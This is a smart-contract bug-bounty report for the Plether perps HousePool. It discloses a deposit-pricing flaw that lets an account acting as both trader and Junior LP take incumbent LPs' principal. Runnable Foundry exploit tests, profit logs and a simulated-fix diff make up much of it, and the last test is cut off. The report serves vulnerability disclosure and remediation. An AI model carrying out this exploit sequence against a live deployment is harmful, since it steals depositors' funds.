# \#98299 [SC-Critical] Junior deposits are priced without the reserve-backed negative-VPI clawback: an LP-trader buys Junior at a depressed NAV and takes incumbent principal (not fixed by the #97591 remediation)

**Submitted on Nov 6th 2026 at 19:51:35 UTC by @luT for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98299
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Theft of unclaimed yield

## Description

## Brief/Intro
A skew-reducing open receives a negative-VPI rebate that the HousePool pays out of cash at once, so Junior NAV drops. The pool is certain to get that rebate back when the position closes or is liquidated, and the amount is held for it in a reserve the trader cannot withdraw. But this receivable is excluded from LP pricing. An account that is both a Junior LP and a trader can therefore:
1. open a position that reduces the skew;
2. deposit into Junior at the depressed price;
3. close at an unchanged mark.

The clawback then flows back into the pool and is shared with the new shares, taken from the incumbent Junior LPs.

Measured on a 33M pool: **+9,922 USDG to the attacker per cycle after all fees, and −16,934 USDG for a 6M honest Junior LP per cycle** (+9,928 / −16,940 once the #97591 fix is applied, which leaves the honest LP below its deposited principal).

**This is not the refundable positive-VPI issue (#97591 / #97841).** I applied the remediation of that issue to a copy of `src`, removing the positive refundable VPI of open positions from NAV. The original PoC then loses money, while this one is unchanged (see "Distinct root cause" and the second PoC).

## Vulnerability Details
**The rebate leaves NAV immediately.** A skew-reducing open has a negative trade cost. The pool pays it out of its cash (`CfdEnginePlanLib.sol:333`, `poolRebatePayoutAssets`), and the next reconcile lowers Junior principal by that amount.

**The rebate is certain to come back.**
- The lifetime clamp `accrued + delta >= 0` (`CloseAccountingLib.sol:116-118`) forces every close or liquidation of that position to claw the rebate back.
- The clawback is pre-funded: the trader must keep a non-withdrawable reserve equal to `max(-vpiAccrued, 0)` (`CfdEnginePlanLib.sol:343-349`, SECURITY.md:866-867). The reserve is consumed on close or liquidation and paid into the pool.

**That certain receivable is excluded from LP pricing.** WHITEPAPER.md:887 says: "The reserve is excluded from the terminal price curve, so LPs cannot **withdraw** it as marked equity before the matching position obligation settles". SECURITY.md:863 says the same.

This exclusion was designed for the **exit** side: it stops LPs from withdrawing value that is not yet in the pool. It has an unhandled mirror on the **entry** side. Between the rebate and the clawback, Junior NAV is understated by exactly the reserved amount, and deposits activate at that understated price. None of the entry gates (`_entriesMaySettle`, `HousePoolTrancheGateLib`) checks for this condition.

**Attack, at an unchanged oracle price**, starting from an existing skew created by honest traders:
1. The attacker's trader account opens on the opposite side and brings the skew back towards zero. It receives the rebate R, and Junior NAV falls by about R.
2. The attacker's LP account deposits into Junior. The request can be placed early and is cancellable until it matures. The deposit is activated by `router.settleLpEpoch` at the depressed price.
3. The trader closes at the same mark. The clamp claws R back from the reserve into the pool. R is now spread over all Junior shares, including the new ones.

The attacker gets about f·R, where f is its share of Junior after the deposit, minus about 8 bps of round-trip fees. The incumbents lose that amount.

## Distinct root cause (not a duplicate of #97591)
| | #97591 / #97841 | This report |
|---|---|---|
| Quantity | positive VPI the trader can still get back, **counted** in NAV | negative-VPI clawback the pool is certain to recover, reserved, **excluded** from NAV |
| Direction | NAV overstated | NAV understated |
| LP leg exploited | redemption (exit) | deposit (entry) |
| Fix | treat refundable positive VPI as a liability | count the reserved clawback as an asset (or block entries while it is outstanding) |

The executable check is in the second PoC below:
- I patched a copy of `src` with the #97591 remediation: `HousePool._getHousePoolInputSnapshot` subtracts Σ max(vpiAccrued, 0) of the open positions from `terminalLpPriceDeltaAssets`.
- Under that patch, **the original #97841 PoC fails**: attacker −1,603 USDG instead of +616, and −13,916 instead of +5,849 at realistic size.
- **This attack is unchanged**: +1,413 and +9,928.
- Fixing one issue does not fix the other.

## Impact Details
- **Who can do it:** any account that is both a Junior LP and a trader. No privileged role is needed. Only public entry points are used: `OrderRouter.commitOrder` / `executeOrder`, `TrancheVault.requestDeposit` / `claimDeposit`, `OrderRouter.settleLpEpoch`.
- **Precondition:** a skew already exists in the pool, which is normal for a perp DEX. The rebate grows with the skew, up to about 20 bps of the notional at the 40 % skew cap.
- **Who loses:** the incumbent Junior LPs. Measured on a realistic pool (26M Senior, 7M Junior, honest LONG skew of 12M ≈ 36 % of depth, attacker deposit of 60M):
  - the rebate R is 21,802 USDG;
  - the attacker nets **+9,922 USDG** after every fee;
  - the honest 6M Junior LP loses **16,934 USDG (−0.28 %) per cycle**.
- **Below principal:** with the #97591 fix applied, the honest LP finishes at 5,982,856 for 6,000,000 deposited.
- **Witness:** the same deposit made *before* the skew-reducing open leaves the attacker at −1,920 (fees only) and the honest LP unchanged. The gain comes only from the timing gap.
- **Smaller capital:** a 7M deposit, equal to the existing Junior, still nets +1,290 while the honest LP loses 9,537.
- **Price exposure:** a few minutes. The trader opens just before the epoch cutoff and closes right after settlement, and the exposure can be hedged off-protocol.
- **Repeatability:** every LP epoch round trip (deposit, 1 h cooldown, redeem), for as long as a skew exists. That is about 2-3 h per cycle.

Severity: Critical (Direct theft of user funds). Incumbent Junior LPs' principal is transferred to the attacker at a constant price, and they end below their deposited principal. This is the same grid the project applied to the positive-VPI variant (#97591).

## Recommendation
Count the outstanding, reserve-backed negative-VPI clawback of open positions as an asset in the NAV used for **entries**. For example, add Σ max(−vpiAccrued, 0) to `distributable` for deposit pricing only, and keep it excluded for redemptions, as the whitepaper intends. Alternatively, block Junior/Senior deposit activation while such a clawback is outstanding.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333-L349
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1836-L1842
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md (VPI section, "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it…")
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md (lines 863-867)


## Proof of Concept

## Proof of Concept

Two runnable PoCs. Only Pyth is mocked, and no in-scope contract is modified in PoC 1. Production risk parameters (DEPLOYMENT.md) are set through `_riskParams()`, because the shared fixture uses `vpiFactor = 0`. The attacker only uses public entry points: `OrderRouter.commitOrder` + `executeOrder` with a historical tick, `TrancheVault.requestDeposit` / `claimDeposit`, and `OrderRouter.settleLpEpoch`.

### PoC 1: the attack on the unmodified code

Save the file below as `packages/perps/test/perps/spec/trader/PocNegativeVpiEntry.t.sol`, then:

```
cd packages/perps
forge test --match-contract PocNegativeVpiEntry --match-test "test_Poc_|test_Witness_|test_Sizing_" -vv
```

Output:

```
[PASS] test_Poc_DepositBetweenNegativeVpiOpenAndClawback()
  VPI accrued (negative = rebate received): -4110695837
  attacker start: 32000000000000
  attacker end:   32001412403461        // +1,412.40 USDG after all fees
  honest Junior start: 6003525012246
  honest Junior end:   6000668894901    // -2,856.12 USDG
[PASS] test_Sizing_RealisticPool()      // 26M Senior + 7M Junior, honest skew 12M, attacker deposit 60M
  VPI accrued (negative = rebate received): -21802446490
  attacker net gain: 9921855685         // +9,921.86 USDG per cycle
  honest Junior loss: 16934359906       // -16,934.36 USDG per cycle
[PASS] test_Sizing_SmallDeposit()       // attacker deposit 7M
  attacker start: 9000000000000
  attacker end:   9001290024827         // +1,290.02 USDG
  honest Junior loss: 9536703836
[PASS] test_Witness_DepositBeforeOpen() // same deposit BEFORE the skew-reducing open
  attacker start: 32000000000000
  attacker end:   31998079796860        // -1,920.20 USDG (fees only)
  honest Junior start: 6003525012246
  honest Junior end:   6003525007100    // unchanged
```

Steps in `_scenario`:
1. An honest Junior LP deposits 6M (plus 26M Senior in the sizing tests), and an honest trader opens a LONG, which creates the skew.
2. The attacker's trader opens an equal SHORT, which reduces the skew. It receives a negative-VPI rebate paid out of pool cash, and the matching clawback is held in the trader's reserve.
3. The attacker's LP deposits into Junior through `router.settleLpEpoch`, at the depressed NAV.
4. The attacker's trader closes at the unchanged mark. The clamp claws the rebate back into the pool, where it is shared with the attacker's new shares.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Mirror of the confirmed refundable-VPI finding, on the NEGATIVE side and the ENTRY leg.
///         A skew-reducing open is paid a VPI rebate out of pool cash (Junior NAV drops), while the matching
///         clawback is a certain, fully reserved receivable that is excluded from terminal NAV. An actor opens
///         such a position, deposits into Junior at the depressed price, then closes: the clawback returns to the
///         pool and is shared with the fresh shares, at the expense of incumbent Junior LPs.
contract PocNegativeVpiEntry is PositionProtectionTest {

    address internal constant ATK_LP = address(0xA77AC1);
    address internal constant ATK_TR = address(0xA77AC2);
    address internal constant HONEST_LP = address(0xC0FFEE);
    address internal constant HONEST_TR = address(0xBEEF01);

    uint256 internal _blockCursor = 10_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _nextBlock() internal {
        _blockCursor += 1;
        vm.roll(_blockCursor);
    }

    function _commitAndExecute(
        address trader,
        OrderV3Types.OrderRequest memory request
    ) internal {
        _nextBlock();
        vm.prank(trader);
        uint64 orderId = OrderRouter(address(router)).commitOrder(request);
        uint64 committedAt = _orderRecord(orderId).core.commitTime;
        _nextBlock();
        vm.warp(uint256(committedAt) + 2);
        bytes[] memory data = _mockUniquePythUpdateDataAt(MARK_PRICE, committedAt + 1, committedAt);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _open(CfdTypes.Side side, uint256 lots, uint256 margin)
        internal
        view
        returns (OrderV3Types.OrderRequest memory r)
    {
        r = _boundedOpenRequest(side, lots * CfdTypes.SIZE_QUANTUM, margin, 0);
    }

    function _close(CfdTypes.Side side, uint256 lots) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _publicBoundedRequest(bytes32(uint256(router.nextCommitId()) + 1e9), true);
        r.side = side;
        r.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
        r.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
    }

    function _settleViaRouter() internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.settleLpEpoch(_livePriceData(MARK_PRICE));
    }

    /// @dev Requests a Junior deposit and activates it through the production Router settlement path.
    function _depositViaRouter(address lp, uint256 amount) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 depId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depId) + 1);
        _settleViaRouter();
        uint256 assets = juniorVault.claimableDepositRequest(depId, lp);
        assertEq(assets, amount, "deposit activated");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(depId, assets, lp, lp);
    }

    struct Run {
        uint256 honestShares;
        uint256 honestStart;
        uint256 honestEnd;
        uint256 atkStart;
        uint256 atkEnd;
        int256 vpiAccrued;
    }

    uint256 internal _seniorSeed;

    /// @param attack When false, the attacker deposits the same amount BEFORE opening (witness: no timing gap).
    function _scenario(uint256 honestLots, uint256 atkDeposit, bool attack) internal returns (Run memory run) {
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        run.honestShares = _fundJuniorDelayed(HONEST_LP, 6_000_000e6);
        if (_seniorSeed != 0) {
            _fundSenior(address(0x5E1105), _seniorSeed);
        }
        console2.log("pool assets before attack:", pool.totalAssets());
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);

        // Pre-existing honest skew (honest trader paid positive VPI long ago; already in NAV).
        _fundTrader(HONEST_TR, 2_000_000e6);
        _commitAndExecute(HONEST_TR, _open(CfdTypes.Side.LONG, honestLots, 1_000_000e6));
        run.honestStart = juniorVault.convertToAssets(run.honestShares);

        _fundTrader(ATK_TR, 2_000_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        uint256 atkShares;
        if (!attack) {
            atkShares = _depositViaRouter(ATK_LP, atkDeposit);
            _refreshMark(MARK_PRICE);
        }

        // 1. Skew-reducing open: pool pays a VPI rebate, Junior NAV drops; the clawback sits in a reserve outside NAV.
        _commitAndExecute(ATK_TR, _open(CfdTypes.Side.SHORT, honestLots, 1_000_000e6));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
        run.vpiAccrued = vpiAccrued;
        console2.log("honest Junior value after rebate:", juniorVault.convertToAssets(run.honestShares));

        // 2. Deposit into Junior at the depressed price (production Router settlement path).
        if (attack) {
            atkShares = _depositViaRouter(ATK_LP, atkDeposit);
        }
        _refreshMark(MARK_PRICE);

        // 3. Close at the unchanged mark: the lifetime clamp claws the rebate back into the pool.
        _commitAndExecute(ATK_TR, _close(CfdTypes.Side.SHORT, honestLots));
        (uint256 sizeAfter,,,,,,) = engine.positions(ATK_TR);
        assertEq(sizeAfter, 0, "attacker flat");

        run.atkStart = atkDeposit + trBalance0;
        run.atkEnd = juniorVault.convertToAssets(atkShares) + clearinghouse.balanceAssets(ATK_TR);
        run.honestEnd = juniorVault.convertToAssets(run.honestShares);

        console2.log("VPI accrued (negative = rebate received):");
        console2.logInt(run.vpiAccrued);
        console2.log("attacker start:", run.atkStart);
        console2.log("attacker end:  ", run.atkEnd);
        console2.log("honest Junior start:", run.honestStart);
        console2.log("honest Junior end:  ", run.honestEnd);
    }

    function test_Poc_DepositBetweenNegativeVpiOpenAndClawback() public {
        Run memory run = _scenario(24_000, 30_000_000e6, true);
        assertLt(run.vpiAccrued, 0, "open received a rebate");
        assertGt(run.atkEnd, run.atkStart, "attacker richer at constant price after fees");
        assertLt(run.honestEnd, run.honestStart, "honest Junior below its pre-attack value");
    }

    function test_Witness_DepositBeforeOpen() public {
        Run memory run = _scenario(24_000, 30_000_000e6, false);
        assertLt(run.atkEnd, run.atkStart, "without the timing gap the round trip costs fees");
    }


    /// @dev Realistic sizing: 26M Senior + 7M Junior, honest skew ~36% of depth, attacker deposit 60M.
    function test_Sizing_RealisticPool() public {
        _seniorSeed = 26_000_000e6;
        Run memory run = _scenario(120_000, 60_000_000e6, true);
        console2.log("attacker net gain:", run.atkEnd - run.atkStart);
        console2.log("honest Junior loss:", run.honestStart - run.honestEnd);
    }

    /// @dev Smaller attacker capital (equal to existing Junior).
    function test_Sizing_SmallDeposit() public {
        _seniorSeed = 26_000_000e6;
        Run memory run = _scenario(120_000, 7_000_000e6, true);
        console2.log("honest Junior loss:", run.honestStart - run.honestEnd);
    }

}
```

### PoC 2: the #97591 remediation does not fix this issue (distinct root cause)

The #97591 remediation is simulated in a **copy** of `src`, used for this comparison only: positive refundable VPI of open positions is removed from NAV. Both PoCs are then run against it:
- the original positive-VPI attack: the PoC from #97841, `PocLpRefundableVpi.t.sol`, reproduced below;
- the attack from this report.

Setup:
1. Copy `packages/perps` to `packages/perps-fix`.
2. Apply the patch below to `packages/perps-fix/src/HousePool.sol`.
3. Mark `PositionProtectionTest.setUp` as `virtual` (`test/perps/spec/trader/PositionProtection.t.sol:73`, a test-only change).
4. Add the two PoC files and `FixSimulation.t.sol`, then run:

```
cd packages/perps-fix
forge test --match-contract FixSim_ --match-test "test_Poc_|test_Witness_|test_Sizing_" -vv
```

Output:

```
FixSim_OriginalPositiveVpi   (the #97841 attack, with the #97591 fix applied)
[FAIL: attacker ends richer at an unchanged price, after all fees: 4598397018138 <= 4600000000000] test_Poc_LpRedeemsOwnRefundableVpiAtHonestLpExpense()
  attacker start: 4600000000000   attacker end: 4598397018138     // -1,603 (was +616 without the fix)
  honest LP value start: 999999995436   end: 1000401176644      // honest LP no longer loses
[PASS] test_Sizing_RealisticPool()
  sizing: attacker start 11000000000000   end 10986083616086     // -13,916 (was +5,849)
  sizing: honest start 5999999988943      end 6005691527734

FixSim_NegativeVpiTwin       (this report, same fix applied)
[PASS] test_Poc_DepositBetweenNegativeVpiOpenAndClawback()
  attacker start: 32000000000000   attacker end: 32001412774139   // +1,412.77, unchanged
[PASS] test_Sizing_RealisticPool()
  attacker net gain: 9928221394                                  // +9,928.22, unchanged
  honest Junior loss: 16939815449
  honest Junior end:  5982856505849                              // below its 6,000,000 USDG deposit
[PASS] test_Witness_DepositBeforeOpen()
  attacker end: 31998079796861                                   // fees only
```

With the #97591 fix applied, the original attack becomes unprofitable, but this one is not affected.

Simulated #97591 remediation (`packages/perps-fix/src/HousePool.sol`):

```diff
@@ -74,6 +74,10 @@
 ///      the owner activates trading. Asset amounts use six-decimal settlement-token units,
 ///      including MockUSDG on the new testnet stack. Unsolicited tokens require explicit recognition before accounting.
 /// @custom:security-contact contact@plether.com
+interface IFixEnginePositions {
+    function positions(address account) external view returns (uint256, uint256, uint256, uint256, uint8, uint64, int256);
+}
+
 contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, ReentrancyGuardTransient {
 
     using SafeERC20 for IERC20;
@@ -1838,9 +1842,22 @@
         view
         returns (HousePoolEngineViewTypes.HousePoolInputSnapshot memory snapshot)
     {
-        return ENGINE_PROTOCOL_LENS.getHousePoolInputSnapshot(poolConfig.markStalenessLimit);
+        snapshot = ENGINE_PROTOCOL_LENS.getHousePoolInputSnapshot(poolConfig.markStalenessLimit);
+        // ---- SIMULATED FIX FOR #97591 (positive refundable VPI of open positions is a contingent liability) ----
+        uint256 refundable;
+        for (uint256 i; i < _fixAccounts.length; ++i) {
+            (,,,,,, int256 vpiAccrued) = IFixEnginePositions(address(ENGINE)).positions(_fixAccounts[i]);
+            if (vpiAccrued > 0) refundable += uint256(vpiAccrued);
+        }
+        snapshot.terminalLpPriceDeltaAssets -= int256(refundable);
     }
 
+    address[] internal _fixAccounts;
+
+    function fixSetAccounts(address[] calldata accounts) external {
+        _fixAccounts = accounts;
+    }
+
     function _getHousePoolStatusSnapshot()
         internal
         view
```

`FixSimulation.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocLpRefundableVpi} from "./PocLpRefundableVpi.t.sol";
import {PocNegativeVpiEntry} from "./PocNegativeVpiEntry.t.sol";

/// @notice Same PoCs, compiled against a copy of src where HousePool excludes the positive refundable VPI of open
///         positions from NAV (the remediation of #97591 / #97841). Only the pricing snapshot is changed.
contract FixSim_OriginalPositiveVpi is PocLpRefundableVpi {
    function setUp() public override {
        super.setUp();
        address[] memory a = new address[](2);
        a[0] = ATK_TR; a[1] = address(0xBEEF01);
        pool.fixSetAccounts(a);
    }
}

contract FixSim_NegativeVpiTwin is PocNegativeVpiEntry {
    function setUp() public override {
        super.setUp();
        address[] memory a = new address[](2);
        a[0] = ATK_TR; a[1] = HONEST_TR;
        pool.fixSetAccounts(a);
    }
}
```

`PocLpRefundableVpi.t.sol` (the PoC of #97841, unchanged):

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Production-parameter PoC through public entrypoints only: an attacker that is both Junior LP and trader
///         marks its own refundable positive VPI into Junior share value, redeems at that value, then recovers the
///         VPI as a close rebate funded by the LPs that stayed.
contract PocLpRefundableVpi is PositionProtectionTest {

    address internal constant ATK_LP = address(0xA77AC1);
    address internal constant ATK_TR = address(0xA77AC2);
    address internal constant HONEST_LP = address(0xC0FFEE);
    uint256 internal constant LOTS = 20_000;

    uint256 internal _blockCursor = 10_000;

    /// @dev Checked-in deployment defaults (DEPLOYMENT.md "Risk parameters"); the shared fixture uses vpiFactor 0.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _nextBlock() internal {
        _blockCursor += 1;
        vm.roll(_blockCursor);
    }

    function _commitAndExecute(
        address trader,
        OrderV3Types.OrderRequest memory request
    ) internal {
        _nextBlock();
        vm.prank(trader);
        uint64 orderId = OrderRouter(address(router)).commitOrder(request);
        uint64 committedAt = _orderRecord(orderId).core.commitTime;
        _nextBlock();
        vm.warp(uint256(committedAt) + 2);
        bytes[] memory data = _mockUniquePythUpdateDataAt(MARK_PRICE, committedAt + 1, committedAt);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _openRequest(uint256 margin) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _boundedOpenRequest(CfdTypes.Side.LONG, LOTS * CfdTypes.SIZE_QUANTUM, margin, 0);
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _publicBoundedRequest(bytes32(uint256(router.nextCommitId()) + 1e9), true);
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = LOTS * CfdTypes.SIZE_QUANTUM;
    }

    function _settleViaRouter() internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.settleLpEpoch(_livePriceData(MARK_PRICE));
    }

    function test_Poc_LpRedeemsOwnRefundableVpiAtHonestLpExpense() public {
        // Honest Junior LP and the attacker's Junior LP account (setup Junior is 1M plus seeds).
        uint256 honestShares = _fundJuniorDelayed(HONEST_LP, 1_000_000e6);
        uint256 atkDeposit = 4_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        uint256 honestStart = juniorVault.convertToAssets(honestShares);

        // LP deposit cooldown before a redemption request.
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);

        uint256 trFunding = 600_000e6;
        _fundTrader(ATK_TR, trFunding);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);

        // 1. Skew-increasing open at the unchanged mark: pays positive VPI, immediately marked into Junior NAV.
        _commitAndExecute(ATK_TR, _openRequest(300_000e6));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
        console2.log("positive VPI paid by attacker trader:", uint256(vpiAccrued));
        assertGt(vpiAccrued, 0, "open paid positive VPI");

        // 2. Attacker LP redeems at the inflated Junior price through the atomic Router settlement path.
        vm.prank(ATK_LP);
        uint256 requestId = juniorVault.requestRedeem(atkShares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(requestId) + 1);
        _settleViaRouter();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(requestId, ATK_LP);
        vm.prank(ATK_LP);
        uint256 redeemed = juniorVault.claimRedeem(requestId, fundedShares, ATK_LP, ATK_LP);

        // 3. Close at the same mark: the lifetime clamp refunds the VPI out of the LPs that stayed.
        _commitAndExecute(ATK_TR, _closeRequest());
        (uint256 sizeAfter,,,,,,) = engine.positions(ATK_TR);
        assertEq(sizeAfter, 0, "position closed");

        uint256 atkEnd = redeemed
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATK_LP))
            + juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(requestId, ATK_LP))
            + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkDeposit + trBalance0;
        uint256 honestEnd = juniorVault.convertToAssets(honestShares);

        console2.log("attacker start (LP deposit + trader balance):", atkStart);
        console2.log("attacker end:                               ", atkEnd);
        console2.log("honest LP value start:", honestStart);
        console2.log("honest LP value end:  ", honestEnd);

        assertGt(atkEnd, atkStart, "attacker ends richer at an unchanged price, after all fees");
        assertLt(honestEnd, honestStart, "honest Junior LP lost principal");
    }


    /// @dev Witness: the identical trade without the intervening redemption leaves the attacker poorer, so the gain
    ///      comes only from redeeming between the VPI charge and its refund.
    function test_Witness_SameTradesWithoutRedemptionLose() public {
        _fundJuniorDelayed(HONEST_LP, 1_000_000e6);
        uint256 atkDeposit = 4_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);
        _fundTrader(ATK_TR, 600_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openRequest(300_000e6));
        _commitAndExecute(ATK_TR, _closeRequest());
        uint256 atkEnd = juniorVault.convertToAssets(atkShares) + clearinghouse.balanceAssets(ATK_TR);
        console2.log("witness attacker start:", atkDeposit + trBalance0);
        console2.log("witness attacker end:  ", atkEnd);
        assertLt(atkEnd, atkDeposit + trBalance0, "without the timed redemption the round trip costs fees");
    }


    // ------------------------------------------------------------------ variants used for severity sizing

    function _openLots(uint256 lots, uint256 margin) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _boundedOpenRequest(CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, margin, 0);
    }

    function _closeLots(uint256 lots) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _publicBoundedRequest(bytes32(uint256(router.nextCommitId()) + 1e9), true);
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
    }

    /// @dev Entry side: an existing LP inflates the Junior price with refundable VPI while an honest deposit
    ///      activates, then takes the refund. The attacker never redeems.
    function test_Variant_HonestDepositorBuysInflatedJunior() public {
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, 2_000_000e6);
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);
        uint256 atkLpStart = juniorVault.convertToAssets(atkShares);

        // Honest depositor queues 2M for the next epoch.
        uint256 honestDeposit = 2_000_000e6;
        settlementToken.mint(HONEST_LP, honestDeposit);
        vm.startPrank(HONEST_LP);
        settlementToken.approve(address(juniorVault), honestDeposit);
        uint256 depId = juniorVault.requestDeposit(honestDeposit, HONEST_LP, HONEST_LP);
        vm.stopPrank();

        _fundTrader(ATK_TR, 600_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openLots(12_000, 200_000e6));

        vm.warp(pool.lpEpochStart(depId) + 1);
        _settleViaRouter();
        uint256 assets = juniorVault.claimableDepositRequest(depId, HONEST_LP);
        vm.prank(HONEST_LP);
        uint256 honestShares = juniorVault.claimDeposit(depId, assets, HONEST_LP, HONEST_LP);

        _commitAndExecute(ATK_TR, _closeLots(12_000));
        uint256 honestEnd = juniorVault.convertToAssets(honestShares);
        uint256 atkEnd = juniorVault.convertToAssets(atkShares) + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkLpStart + trBalance0;
        console2.log("entry variant: honest deposit", honestDeposit);
        console2.log("entry variant: honest value end", honestEnd);
        console2.log("entry variant: attacker start", atkStart);
        console2.log("entry variant: attacker end  ", atkEnd);
    }

    /// @dev Realistic sizing: 26M Senior, 6M honest Junior (+1M fixture), 10M attacker Junior, skew near the 40% cap.
    function test_Sizing_RealisticPool() public {
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        uint256 honestShares = _fundJuniorDelayed(HONEST_LP, 6_000_000e6);
        uint256 atkDeposit = 10_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        _fundSenior(address(0x5E1105), 26_000_000e6);
        uint256 honestStart = juniorVault.convertToAssets(honestShares);
        console2.log("pool assets", pool.totalAssets());
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);

        uint256 lots = 170_000;
        _fundTrader(ATK_TR, 1_000_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openLots(lots, 400_000e6));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
        console2.log("VPI paid", uint256(vpiAccrued));

        vm.prank(ATK_LP);
        uint256 rid = juniorVault.requestRedeem(atkShares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(rid) + 1);
        _settleViaRouter();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(rid, ATK_LP);
        console2.log("funded shares", fundedShares, atkShares);
        vm.prank(ATK_LP);
        uint256 redeemed = juniorVault.claimRedeem(rid, fundedShares, ATK_LP, ATK_LP);
        _commitAndExecute(ATK_TR, _closeLots(lots));

        uint256 atkEnd = redeemed + juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(rid, ATK_LP))
            + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkDeposit + trBalance0;
        console2.log("sizing: attacker start", atkStart);
